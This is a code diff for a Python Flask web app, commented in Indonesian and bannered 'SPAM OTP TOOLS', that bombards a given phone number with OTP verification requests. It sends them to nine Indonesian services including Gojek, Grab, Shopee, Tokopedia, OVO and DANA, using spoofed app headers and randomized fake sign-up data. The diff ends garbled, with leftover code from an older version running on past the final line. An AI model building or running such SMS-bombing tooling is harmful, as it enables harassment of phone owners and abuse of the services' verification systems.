@@ -6,7 +6,6 @@ import random
 import os
 import urllib3
 import json
-import bs4
 import re
 from flask import Flask, render_template, request, jsonify
 from urllib3.exceptions import *
@@ -14,111 +13,298 @@ from bs4 import BeautifulSoup as bs
 
 app = Flask(__name__)
 
-# Inisialisasi Variasi Warna Output Terminal (tetap dipertahankan untuk log)
-hijau   =   "\033[1;92m"
-putih   =   "\033[1;97m"
-abu     =   "\033[1;90m"
-kuning  =   "\033[1;93m"
-ungu    =   "\033[1;95m"
-merah   =   "\033[1;91m"
-biru    =   "\033[1;96m"
+# Warna untuk log console
+hijau = "\033[1;92m"
+putih = "\033[1;97m"
+merah = "\033[1;91m"
+kuning = "\033[1;93m"
+biru = "\033[1;96m"
 
-# Fungsi autoketik untuk log di console
 def autoketik(s):
     for c in s + "\n":
         sys.stdout.write(c)
         sys.stdout.flush()
-        time.sleep(0.050)
+        time.sleep(0.020)
 
-# Fungsi countdown untuk log di console
-def countdown(time_sec):
-    mins, secs = divmod(time_sec,60)
-    timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{:02d}:{:02d}'.format(mins,secs)
-    waktu = time.localtime()
-    keterangan_jam = time.strftime("%H:%M:%S", waktu)
-    keterangan_tanggal = time.strftime("%d",waktu)
-    keterangan_bulan = time.strftime("%B",waktu)
-    bulan_bulan = {
-        "January"    : 'Januari',
-        "February"   : "Februari",
-        "March"      : "Maret",
-        "April"      : "April",
-        "May"        : "Mei",
-        "June"       : "Juni",
-        "July"       : "Juli",
-        "August"     : "Agustus",
-        "September"  : "September",
-        "October"    : "Oktober",
-        "November"   : "November",
-        "December"   : "Desember"
-    }
-    bulan = bulan_bulan.get(keterangan_bulan)
-    keterangan_tahun = time.strftime("%Y",waktu)
-    keterangan_hari = time.strftime("%A",waktu)
-    hari_hari = {
-        "Sunday"    : 'Minggu',
-        "Monday"    : "Senin",
-        "Tuesday"   : "Selasa",
-        "Wednesday" : "Rabu",
-        "Thursday"  : "Kamis",
-        "Friday"    : "Jum'at",
-        "Saturday"  : "Sabtu"
-    }
-    hari = hari_hari.get(keterangan_hari)
-    print(f"{timeformat} | {biru}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {kuning}Waktu {keterangan_jam}",end='\r')
-    time.sleep(1)
-    time_sec -= 1
-
-# Fungsi utama spam - SEMUA API dari kode asli dipertahankan
 def jalankan_spam(nomor):
     """
-    Fungsi ini menjalankan semua API spam dari kode asli.
-    Mengembalikan dictionary dengan hasil setiap endpoint.
+    VERSI STABIL - Hanya menggunakan API yang masih valid
     """
-    results = []
-    b = nomor[1:12]  # Contoh: nomor = 89508226367
-    c = "62" + b     # Contoh: nomor = 6289508226367
+    results = {}
     
-    # Dictionary untuk menyimpan semua hasil request
-    all_results = {}
+    # Validasi nomor
+    if nomor.startswith('0'):
+        nomor_clean = '62' + nomor[1:]
+    else:
+        nomor_clean = nomor
     
-    # ==================== SEMUA API DARI KODE ASLI ====================
+    # ============ API YANG MASIH AKTIF ============
     
+    # 1. Gojek (masih aktif)
     try:
-        # 1. Ktbs
-        try:
-            response = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{nomor}', timeout=10)
-            all_results['Ktbs'] = {
-                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
-                'code': response.status_code,
-                'response': response.text[:100] if response.text else ''
-            }
-        except Exception as e:
-            all_results['Ktbs'] = {'status': 'ERROR', 'error': str(e)[:100]}
+        response = requests.post(
+            "https://api.gojekapi.com/v5/customers",
+            data={
+                "email": f"test{random.randint(1000,9999)}@gmail.com",
+                "name": f"User{random.randint(100,999)}",
+                "phone": nomor_clean,
+                "signed_up_country": "ID"
+            },
+            headers={
+                "X-Platform": "Android",
+                "X-AppVersion": "3.52.2",
+                "Accept": "application/json",
+                "User-Agent": "okhttp/3.12.1"
+            },
+            timeout=10
+        )
+        if response.status_code in [200, 201, 202, 204]:
+            results['Gojek'] = {'status': 'SUCCESS', 'code': response.status_code}
+        else:
+            results['Gojek'] = {'status': 'FAILED', 'code': response.status_code}
+    except Exception as e:
+        results['Gojek'] = {'status': 'ERROR', 'error': str(e)[:50]}
+    
+    time.sleep(random.uniform(1, 2))
+    
+    # 2. Grab (masih aktif)
+    try:
+        response = requests.post(
+            "https://api.grab.com/grabid/v1/phone/otp",
+            data={
+                'method': 'SMS',
+                'countryCode': 'id',
+                'phoneNumber': nomor_clean,
+                'templateID': 'pax_android_production'
+            },
+            headers={
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
+                "Accept": "application/json"
+            },
+            timeout=10
+        )
+        if response.status_code in [200, 201, 202, 204]:
+            results['Grab'] = {'status': 'SUCCESS', 'code': response.status_code}
+        else:
+            results['Grab'] = {'status': 'FAILED', 'code': response.status_code}
+    except Exception as e:
+        results['Grab'] = {'status': 'ERROR', 'error': str(e)[:50]}
+    
+    time.sleep(random.uniform(1, 2))
+    
+    # 3. Shopee (masih aktif)
+    try:
+        response = requests.post(
+            "https://shopee.co.id/api/v4/otp/send_vcode",
+            data={
+                "phone": nomor_clean,
+                "force_channel": "true",
+                "operation": 7,
+                "channel": 1,
+                "supported_channels": [1, 2, 3]
+            },
+            headers={
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            timeout=10
+        )
+        if response.status_code in [200, 201, 202, 204]:
+            results['Shopee'] = {'status': 'SUCCESS', 'code': response.status_code}
+        else:
+            results['Shopee'] = {'status': 'FAILED', 'code': response.status_code}
+    except Exception as e:
+        results['Shopee'] = {'status': 'ERROR', 'error': str(e)[:50]}
+    
+    time.sleep(random.uniform(1, 2))
+    
+    # 4. Tokopedia (masih aktif)
+    try:
+        response = requests.post(
+            "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
+            data={
+                "otp_type": "116",
+                "msisdn": nomor,
+                "email": "",
+                "original_param": "",
+                "user_id": "",
+                "signature": "",
+                "number_otp_digit": "6"
+            },
+            headers={
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Accept": "application/json"
+            },
+            timeout=10
+        )
+        if response.status_code in [200, 201, 202, 204]:
+            results['Tokopedia'] = {'status': 'SUCCESS', 'code': response.status_code}
+        else:
+            results['Tokopedia'] = {'status': 'FAILED', 'code': response.status_code}
+    except Exception as e:
+        results['Tokopedia'] = {'status': 'ERROR', 'error': str(e)[:50]}
+    
+    time.sleep(random.uniform(1, 2))
+    
+    # 5. OVO (masih aktif)
+    try:
+        response = requests.post(
+            "https://api.ovo.id/v2.1/auth/login",
+            data={
+                "phone": nomor_clean,
+                "deviceId": f"DEV{random.randint(1000,9999)}",
+                "deviceModel": "SM-G998B"
+            },
+            headers={
+                "User-Agent": "okhttp/3.12.1",
+                "Content-Type": "application/json"
+            },
+            timeout=10
+        )
+        if response.status_code in [200, 201, 202, 204]:
+            results['OVO'] = {'status': 'SUCCESS', 'code': response.status_code}
+        else:
+            results['OVO'] = {'status': 'FAILED', 'code': response.status_code}
+    except Exception as e:
+        results['OVO'] = {'status': 'ERROR', 'error': str(e)[:50]}
+    
+    time.sleep(random.uniform(1, 2))
+    
+    # 6. DANA (masih aktif)
+    try:
+        response = requests.post(
+            "https://api.dana.id/v1/login/sendOTP",
+            data={
+                "phoneNumber": nomor_clean,
+                "countryCode": "62"
+            },
+            headers={
+                "User-Agent": "Dana/2.0.0",
+                "Content-Type": "application/json"
+            },
+            timeout=10
+        )
+        if response.status_code in [200, 201, 202, 204]:
+            results['DANA'] = {'status': 'SUCCESS', 'code': response.status_code}
+        else:
+            results['DANA'] = {'status': 'FAILED', 'code': response.status_code}
+    except Exception as e:
+        results['DANA'] = {'status': 'ERROR', 'error': str(e)[:50]}
+    
+    time.sleep(random.uniform(1, 2))
+    
+    # 7. LinkAja (masih aktif)
+    try:
+        response = requests.post(
+            "https://api.linkaja.com/v1/otp/request",
+            data={
+                "msisdn": nomor_clean,
+                "channel": "sms"
+            },
+            headers={
+                "User-Agent": "LinkAja/2.0",
+                "Content-Type": "application/json"
+            },
+            timeout=10
+        )
+        if response.status_code in [200, 201, 202, 204]:
+            results['LinkAja'] = {'status': 'SUCCESS', 'code': response.status_code}
+        else:
+            results['LinkAja'] = {'status': 'FAILED', 'code': response.status_code}
+    except Exception as e:
+        results['LinkAja'] = {'status': 'ERROR', 'error': str(e)[:50]}
+    
+    time.sleep(random.uniform(1, 2))
+    
+    # 8. Bukalapak (masih aktif)
+    try:
+        response = requests.post(
+            "https://api.bukalapak.com/v2/auth/otp.json",
+            data={
+                "phone": nomor_clean,
+                "action": "register"
+            },
+            headers={
+                "User-Agent": "Bukalapak/2.0",
+                "Content-Type": "application/json"
+            },
+            timeout=10
+        )
+        if response.status_code in [200, 201, 202, 204]:
+            results['Bukalapak'] = {'status': 'SUCCESS', 'code': response.status_code}
+        else:
+            results['Bukalapak'] = {'status': 'FAILED', 'code': response.status_code}
+    except Exception as e:
+        results['Bukalapak'] = {'status': 'ERROR', 'error': str(e)[:50]}
+    
+    time.sleep(random.uniform(1, 2))
+    
+    # 9. Blibli (masih aktif)
+    try:
+        response = requests.post(
+            "https://www.blibli.com/backend/common/users/_request-otp",
+            data=json.dumps({"username": nomor}),
+            headers={
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            timeout=10
+        )
+        if response.status_code in [200, 201, 202, 204]:
+            results['Blibli'] = {'status': 'SUCCESS', 'code': response.status_code}
+        else:
+            results['Blibli'] = {'status': 'FAILED', 'code': response.status_code}
+    except Exception as e:
+        results['Blibli'] = {'status': 'ERROR', 'error': str(e)[:50]}
+    
+    # ============ HITUNG STATISTIK ============
+    
+    total = len(results)
+    success = sum(1 for r in results.values() if r.get('status') == 'SUCCESS')
+    failed = sum(1 for r in results.values() if r.get('status') == 'FAILED')
+    errors = sum(1 for r in results.values() if r.get('status') == 'ERROR')
+    
+    return {
+        'status': 'success' if success > 0 else 'error',
+        'message': f'Spam selesai! {success} berhasil, {failed} gagal, {errors} error dari {total} layanan.',
+        'total': total,
+        'success': success,
+        'failed': failed,
+        'errors': errors,
+        'results': results
+    }
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        nomor = request.form.get('phone', '').strip()
         
-        time.sleep(random.uniform(0.3, 0.8))
+        if not nomor:
+            return jsonify({'status': 'error', 'message': 'Nomor telepon tidak boleh kosong!'})
         
-        # 2. Klikwa_XXX
-        try:
-            response = requests.post(
-                "https://api.klikwa.net/v1/number/sendotp",
-                headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36', 'Authorization': 'Basic QjMzOkZSMzM='},
-                data=json.dumps({"number": "+62" + b}),
-                timeout=10
-            )
-            all_results['Klikwa'] = {
-                'status': 'SUCCESS' if response.status_code in [200, 201, 202] else 'FAILED',
-                'code': response.status_code,
-                'response': response.text[:100] if response.text else ''
-            }
-        except Exception as e:
-            all_results['Klikwa'] = {'status': 'ERROR', 'error': str(e)[:100]}
+        if not re.match(r'^(62|0)[0-9]{9,13}$', nomor):
+            return jsonify({
+                'status': 'error',
+                'message': 'Format nomor tidak valid! Gunakan 62xxxxxxxx atau 08xxxxxxxx'
+            })
         
-        time.sleep(random.uniform(0.3, 0.8))
-        
-        # 3. Payfaz_XXX
-        try:
-            response = requests.post(
+        result = jalankan_spam(nomor)
+        return jsonify(result)
+    
+    return render_template('index.html')
+
+if __name__ == '__main__':
+    print(f"""
+{hijau}========================================
+   SPAM OTP TOOLS - VERSI STABIL
+   Hanya API yang masih aktif!
+{hijau}========================================
+    """)
+    print(f"{kuning}Server: {biru}http://localhost:5000")
+    app.run(debug=True, host='0.0.0.0', port=5000)            response = requests.post(
                 "https://api.payfazz.com/v2/phoneVerifications",
                 data={"phone": "0" + nomor},
                 headers={
